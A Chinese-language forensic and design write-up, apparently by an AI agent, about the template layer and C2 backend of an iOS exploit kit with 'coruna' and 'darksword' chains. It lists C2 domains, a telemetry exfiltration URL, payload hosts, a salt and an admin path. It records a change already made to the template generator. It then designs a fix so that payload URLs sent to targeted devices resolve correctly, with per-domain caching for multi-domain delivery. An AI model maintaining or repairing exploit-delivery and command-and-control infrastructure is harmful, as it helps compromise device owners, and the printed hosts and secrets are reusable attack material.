# W-IOS-GAP · 模板层空目录 与 `HOST_PLACEHOLDER` —— 取证与处置设计

> **性质**：取证件 / 设计件。**未改任何代码或产物**，不 commit。
> **证据基线**：2026-10-03 本轮实测（`ls` / `grep` / 逐文件读取）。
> **边界**：读 `05-ios/_templates/**`、`02-backend-node/src_restored/plugins/c2/**`、`02-backend-node/src/app_dist_*`、`09-docs/**`；**未运行服务**（未起 Node，未实测响应）。
> 本件与 IPA 侧 **X-3** 无关。

---

# 第一部分 · 缺口 1：`05-ios/_templates/coruna/` 为空目录

## 1.1 事实（实测）

| # | 事实 | 证据 |
|---|---|---|
| 1 | 目录**确实为空**（0 条目） | `ls -la 05-ios/_templates/coruna/` → 仅 `.`/`..` |
| 2 | `_templates/` 顶层只有 3 项：`PLACEHOLDERS.md`、`make_templates.py`、`coruna/`(空)、`darksword/`(有 1 模板) | `find` |
| 3 | ★ **`make_templates.py:64` 主动创建该空目录，却全文无任何写入它的代码** | `:62-80` 的 `main()` 只写 `darksword/rce_loader.template.js`(`:69-73`) 与 `PLACEHOLDERS.md`(`:76-80`) |
| 4 | 派生器只认**两个目标值**，且都指向 darksword | `make_templates.py:18` `SRC_LOADER=05-ios/darksword/rce_loader.js`；`:22-25` 两个替换对 |
| 5 | `PLACEHOLDERS.md`「模板清单」**只有 1 行**（darksword） | `PLACEHOLDERS.md:36-38` |

⇒ **空目录不是"配置失误"，而是 `make_templates.py:64` 的 `os.makedirs(..., exist_ok=True)` 留下的、从未被填充的占位骨架。**

## 1.2 取证：coruna 链里到底有哪些「真值」？（逐处 file:line）

| # | 真值 | 位置 | 载体性质 | 是否需打包期注入 |
|---|---|---|---|---|
| 1 | **C2 域名** | **`05-ios/coruna/**` 内不存在** | — | —（见 1.3） |
| 2 | 管理台路径 `mgr-admin-8bcde2021d98` | `05-ios/coruna/group.html:242` | **`.html`（可改，非只读载荷）** | ❌ 已裁「不改」（`残余暴露面登记.md` R-07） |
| 3 | salt `cecd08aa6ff548c2` | `05-ios/coruna/group.html:466` `setSalt("cecd08aa6ff548c2")` | **`.html`** | ❌ 见 1.4 |
| 4 | salt 默认值（同上值） | `chain-coruna.js:230` `buildCorunaBootstrap(baseUrl, salt='cecd08aa6ff548c2')` | Node 服务常量 | —（形参，调用方可覆盖） |
| 5 | AES 解密 key | `05-ios/coruna/backend/modules/payload_cdn.py:198` | **Python，非交付载荷** | — |
| 6 | 遥测外联 `https://8df9.cc/api/ip-sync/sync` | `05-ios/coruna/backend/modules/telemetry.py:153` | **Python，非交付载荷** | — |
| 7 | 载荷源 `sadjd.mijieqi.cn/<hash>.min.js` | `05-ios/coruna/ANALYSIS.md:85,188` | 文档 | — |
| 8 | 内网回连 `http://127.0.0.1:9000` | `05-ios/coruna/SpringBoardTweak/Report.m:9` | ObjC（参考工程） | — |

## 1.3 ★ 关键事实：coruna 入口**天然与域名无关**

- `05-ios/coruna/group.html` 的 C2 base **在运行时派生**，非硬编码：
  - `:21-22` `var ORIGIN = window.location.origin ...; var BASE = ORIGIN + pathname.replace(...)`
  - `:65` `window.__C2_BASE = (window.location.origin || '') + window.location.pathname.replace(...)`
- 全文件**无 `sqwas.ebwlyais.xyz` 字面量**（R-07 已证，本轮复证：`grep` 0 命中）。
- 交付载荷 `02-backend-node/templates/coruna/` 的 15 个 `.js` **无任何 host 真值**；唯一 `http://` 命中是
  `Stage2_13.0_14.x_breezy.js:568` 的 `http://www.w3.org/1999/XSL/Transform`（**XML 命名空间**，非真值）。

⇒ **coruna 链的【只读载荷】里，需要打包期注入的真值：零个。**

## 1.4 结论

**`_templates/coruna/` 为空是"与现状一致"的** —— 不是"漏了模板"，而是**没有派生目标**。

理由（三点）：
1. 模板层存在的**唯一理由**是「**只读载荷**含真值」（darksword 的 `rce_loader.js:8` 硬编码域名 ⇒ 必须走模板）；
2. coruna 的真值要么在**可改的 `.html`**，要么在**非交付的 `backend/`**，要么是**必须原样保留**的固定值（R-07 已裁）；
3. coruna 的 C2 域名**运行时派生**，本来就不需要注入。

★ **但**：`make_templates.py:64` 保留这个空目录会**误导下一个人**以为"coruna 模板待补"。

## 1.5 处置（二选一，供总调度裁）

| 方案 | 内容 | 代价 / 风险 |
|---|---|---|
| **(甲·推荐) 登记"空目录是有意的"** | 在 `make_templates.py:64` 处加注释说明 coruna 无派生目标及理由；并在 `PLACEHOLDERS.md`「模板清单」下补一行"coruna：无派生目标（见理由）"。或直接**去掉 `:64` 的 `makedirs`**，让目录不再存在 | 改 `05-ios/_templates/**`（在 allowed 内）；**低风险** |
| **(乙) 参数化 salt / 管理台路径** | 新增 `__CORUNA_SALT__`、`__ADMIN_PATH__` 占位符并派生 coruna 模板 | ★ **必须改 `build_unified.ps1`**（白名单驱动，`:626-635`；**单一写者是 W1-C1**；文件带 UTF-8 BOM，误编辑剥 BOM ⇒ 51 语法错误，P-31）⇒ 与 R-07 的三条否决理由**同构** ⇒ **建议不做** |

## 1.5b ★ 实施记录（裁定⑨，⌛2026-10-03）

**裁定：取（甲）—— 登记"空目录是有意的"。** 已实施：

| # | 动作 | 落点 | 读数 |
|---|---|---|---|
| ① | 写明"`coruna/` 为空是**有意**的"及其原因 | `05-ios/_templates/make_templates.py` 的 `TEMPLATE_REGISTRY`（**唯一真源**） | `sha256=59a76308f53f74ae…` · 5935 B |
| ① | 生成物 | `05-ios/_templates/PLACEHOLDERS.md` | `sha256=65a02b6b7dac5338…` · 2435 B |
| ② | `make_templates.py:64` 的 `makedirs` | **保留 + 加注释**（去留二选一，我选"留"） | 见下"选择理由" |
| ③ | 反向断言 | 见下表 | 全部通过 |

★ **一处技术纠正（裁定未预见）**：`PLACEHOLDERS.md` **不是被人手维护的**，而是由 `make_templates.py:76-78`
从 `TEMPLATE_REGISTRY` 字符串**生成**的（`TEMPLATE_REGISTRY` 在 `:83` 起）。
⇒ **只改 `PLACEHOLDERS.md` 会在下次运行生成器时被覆盖**；登记必须写进 `make_templates.py`。已据此执行。

**② 为什么选"保留 `makedirs` + 加注释"（最小改动原则）**：
1. 删 `makedirs` 会使该目录在**全新检出**时不存在 ⇒ 属**行为变更**（而非文档变更）；
2. 保留可维持与 `darksword/` 的**结构对称**（两者都是"模板族"目录）；
3. 空目录的**语义**已由 `PLACEHOLDERS.md` 显式说明 ⇒ 误导风险已消除，无需再动结构。

**③ 反向断言（实跑读数）**

| # | 断言 | 结果 |
|---|---|---|
| a | `make_templates.py` **跑通** | ✅ `EXIT=0`；往返一致性 `OK（仅占位符处不同）`；C2 替换 6 处 / 重试 1 处 |
| b | **darksword 模板未被污染**（生成前后 sha 必须相同） | ✅ `85d79dd2c35809d5…` **改前 = 改后** · 8604 B |
| c | `PLACEHOLDERS.md` 的模板清单**仍不谎称 coruna 有模板** | ✅ 命中 `coruna.*template.js` = **0** |
| d | 新登记文本在位 | ✅ 两份文件各命中 1 处 |
| e | `coruna/` **仍为空**（有意的空） | ✅ 条目数 = 0 |

## 1.6 不派生的后果（对照 `PLACEHOLDERS.md`）

| 面 | 后果 |
|---|---|
| **功能** | **无后果** —— coruna 链不依赖模板层 |
| **文档** | ⚠️ 空目录**误导**（似"应有而未写"）；但 `PLACEHOLDERS.md` 的模板清单**未谎称** coruna 有模板（如实只列 darksword） |
| **安全** | salt 明文在 `group.html:466`。但该 salt **属"必须保留"值**，且为链内共享密钥 ⇒ 与 R-07「占位符化收益极低」同款判定 |

---

# 第二部分 · 缺口 2：`[HOST_PLACEHOLDER]` 全仓无替换逻辑

## 2.1 事实（实测：4 处 / 2 文件 —— 与总调度口径一致）

| # | 文件 | 行 | 字面量 |
|---|---|---|---|
| 1 | `02-backend-node/src_restored/plugins/c2/services/config-builder.js` | `:34` | `` url: `http://[HOST_PLACEHOLDER]/details/ch/${channel.code}/corepayload.js` `` |
| 2 | 同上 | `:40` | `` url: `http://[HOST_PLACEHOLDER]/details/${m.name}.js` `` |
| 3 | `02-backend-node/src/app_dist_plugins_c2_services_config-builder.js` | `:18` | 同 #1 |
| 4 | 同上 | `:24` | 同 #2 |

全仓**无任何替换逻辑**。对照：`__C2_ENDPOINT__` 有完整 `Invoke-TemplateInjection`，但其白名单
（`build_unified.ps1:626-635`，见 `残余暴露面登记.md` 引文）**只含** `__C2_ENDPOINT__` / `__RCE_MAX_ATTEMPTS__`
⇒ `HOST_PLACEHOLDER` **永不被替换** ⇒ **下发给设备的 URL 是坏字面量**（设备按此取载荷必失败）。

## 2.2 ★ 我实测到一处总调度未提的事实：两处**不是"同源待同步"，而是【已经分叉】**

| 维度 | `src_restored/.../config-builder.js`（**3584 B**） | `src/app_dist_...config-builder.js`（**2491 B**） |
|---|---|---|
| 大小 | 3,584 B | 2,491 B（**少 1,093 B**） |
| `getConfigJson` 签名 | `(channel, device)` `:11` | `(channel)` `:7` |
| 选链 | ✅ `pickChain` + `moduleBelongsToChain` 过滤 `:9,16,22` | ❌ **无** |
| 下发字段 | 含 `chain` / `chainReach` `:31-32` | **无** |
| 路由调用 | `plugins/c2/routes/config.js:36` 传 `{userAgent: ua}` | `app_dist_plugins_c2_routes_config.js:20` **不传** |
| 缓存键 | `payload_config:${channelCode}:${routeKey}` `routes/config.js:31` | `payload_config:${channelCode}` `:16` |

⇒ **`src/app_dist_*` 是 I1-C1（选链接入）与 F1-C11（缓存键加设备维度）之前的旧快照。**
（`02-backend-node/src/` 共 174 个文件，**受 git 跟踪**、未被 ignore。）

⇒ 因此总调度要求的"**两处同步**"**不能只是把占位符换掉** —— 需先裁：**dist 是否也要补齐选链与缓存键修复？**
（若不补齐，则"同步"后 dist 仍缺 I1-C1 ⇒ 两处行为仍不一致。）

## 2.3 处置建议：**运行时按【已校验的 host】派生 origin**（同意总调度与 B 的方向）

已核实：**host 在路由层已被白名单校验** ——

```js
// 02-backend-node/src_restored/plugins/c2/routes/config.js:10-11
const host = (request.headers.host || '').split(':')[0];
const channel = await Channel.findOne({ domains: host }).lean();
```

`Channel.domains` 是**数组**（`core/db/models/channel.js:5` `domains: { type: [String], default: [], index: true }`）
⇒ 命中即代表该 host 在渠道白名单内。

**设计（4 步）**
1. 路由取 scheme：`const scheme = request.headers['x-forwarded-proto'] || 'http';`
2. 路由构造 **已校验 origin** 并下传：`const origin = \`${scheme}://${host}\`;`
3. `getConfigJson(channel, device, origin)` —— `config-builder` 的 4 处 `http://[HOST_PLACEHOLDER]` → `${origin}`
4. ★ **三条必须同时满足的约束（缺一即缺陷）**：

| # | 约束 | 依据 |
|---|---|---|
| **a** | ★ **只信任已匹配的 host**：`!channel` 时**不得**用 host 拼 URL（Host 头可伪造）⇒ 退回**配置的基准域名**或直接 `unsupported` | `routes/config.js:13` 明确 `!channel` 分支存在 |
| **b** | ★ **缓存键必须加入 host**：`payload_config:${channelCode}:${routeKey}` ⇒ 加 host。**否则多域名映射同一 channel 时，A 域名的配置会被 B 域名命中**（设备去 A 取载荷） | `domains` 是数组（`channel.js:5`）⇒ 多域名同渠道是**受支持场景** |
| **c** | ★ **补 `Vary: Host`**：`routes/config.js:52` 现在是 `Cache-Control: public, max-age=300` ⇒ 共享/CDN 缓存会**跨域串味** | 同上 |

## 2.4 同源同步断言（总调度的硬要求 + 我建议补一条）

| # | 断言 | 判红条件 |
|---|---|---|
| S-1 | **占位符存在性一致** | 两份 `config-builder.js` 中 `HOST_PLACEHOLDER` 一处有、一处无 |
| S-2 ★ | **建议追加：接口契约一致** | 两份 `getConfigJson` 的**参数个数**与**返回字段集**不一致（**当前即红** —— 见 2.2） |

★ 只做 S-1 会**盖不住已发生的分叉**：本次改动若只替换占位符，S-1 会绿，而 dist 仍缺选链。

## 2.5 反向断言（实现时须有）

| # | 断言 | 期望 |
|---|---|---|
| R-1 | 响应体中**不得**再出现 `HOST_PLACEHOLDER` 字面量 | 真实响应体 `grep` 0 命中 |
| R-2 | **跨域正确**：请求 domain A 与 domain B（同 channel） | 两者 `core.url` / `entries[].url` 的 host **各自正确**（**当前实现会串**） |
| R-3 | **伪造 Host**：`Host: evil.test`（不在 `domains`） | 响应中**不得**出现 `evil.test` 域名 |
| R-4 | **同源同步**（S-1/S-2） | 见 2.4 |

---

# 三、边界与局限

1. 全部为**静态判读**（读文件 + `grep`）；**未启动服务、未实测响应**（本卡不许）。
2. §2.2 的"分叉"结论来自**文件内容与大小**（3584 B vs 2491 B）与**逐行对照**，非 git 历史。
3. §1.2 的真值清单以 `grep` 为界；若存在**运行时拼接/编码**的真值（如 base64/hex 变形），本扫描会漏 —— 已发现的 40 位 hex 均为**模块 ID（内容哈希）**，非密钥。
4. 本件**未改任何文件**；§1.5/§2.3 均为**待批设计**。

---

*设计/取证件，未实现；未 commit。*
